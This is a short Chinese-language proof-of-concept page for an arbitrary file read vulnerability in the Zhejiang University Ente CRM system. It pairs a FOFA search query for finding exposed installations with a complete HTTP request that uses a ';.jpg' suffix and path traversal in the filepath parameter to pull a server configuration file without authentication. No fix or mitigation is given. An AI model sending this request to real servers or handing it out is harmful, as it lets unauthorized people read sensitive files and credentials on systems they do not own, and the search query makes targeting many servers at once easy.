# 浙大恩特客户资源管理系统 i0004_openFileByStream.jsp 任意文件读取漏洞

## 1.漏洞描述

浙大恩特客户资源管理Q系统是一款外贸管理软件，它提供了多种功能，包括客户档案管理、邮件管理、OA外贸办公管理系统、分管权限管理、联系跟进及提醒、业务检查管理、统计分析管理等。

浙大恩特客户资源管理系统存在任意文件读取漏洞。未授权的攻击者可以通过该漏洞读取服务器任意文件，从而获取大量敏感信息。

## 2.搜索语法

```plain
fofa：title="欢迎使用浙大恩特客户资源管理系统"
```

## 3.漏洞复现

```plain
GET /entsoft/module/i0004_openFileByStream.jsp;.jpg?filepath=/../EnterCRM/bin/xy.properties&filename=conan HTTP/1.1
Host: 127.0.0.1
Accept-Encoding:gzip,deflate,br
Accept:*/*
Accept-Language:en-US;q=0.9,en;q=0.8
User-Agent:Mozilla/5.0(WindowsNT 10.0: Win64:x64)AppleWebKit/537.36(KHTML, likeGecko) Chrome/116.0.5845.111 Safari/537.36
Connection:close
Cache-Control:max-age=0
```

![image](https://github.com/hardog123/poc-exp/assets/170905460/3547e51c-e6e3-4911-866c-40109c2ad039)
